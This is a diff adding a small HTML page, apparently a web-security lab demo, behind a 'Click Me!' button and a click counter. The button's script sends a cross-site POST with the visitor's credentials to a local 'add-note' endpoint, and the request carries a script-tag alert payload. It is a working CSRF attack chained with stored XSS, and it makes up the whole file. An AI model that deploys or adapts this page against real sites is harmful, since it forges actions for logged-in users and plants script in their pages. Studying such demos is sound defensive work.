@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Me!</title>
+</head>
+<body>
+    <button id="runscript">Click Me!</button>
+   <p id="message">You've clicked the button 0 times.</p>
+   <script>
+    document.addEventListener("DOMContentLoaded", () =>{
+        let i=0;
+        const button = document.getElementById("runscript");
+        const message = document.getElementById("message");
+        //console.log("button is", button)
+        const payload = [];
+        const alertmsg = "\"Bad news, you have been hacked!\""
+        const scripttag = "script"
+        const badstuff = `This is the bad stuff: <${scripttag}>alert(${alertmsg})</${scripttag}>`
+        payload.push(`${encodeURIComponent("title")}=${encodeURIComponent("Surprise!")}`);
+        payload.push(`${encodeURIComponent("text")}=${badstuff}`);
+        const urlEncodedData = payload.join('&').replace(/%20/g, '+');
+
+        button.addEventListener("click", async () => {
+            console.log("doing fetch")
+            fetch("http://localhost:3000/restricted/add-note",{
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: urlEncodedData,
+                mode: 'no-cors',
+                credentials: 'include'
+            }).then((response) => {console.log(response)})
+            .catch((err) => console.log(err))
+            i++;
+            message.textContent = `You've clicked the button ${i} times.`
+        });
+    });
+   </script>
+</body>
+</html>
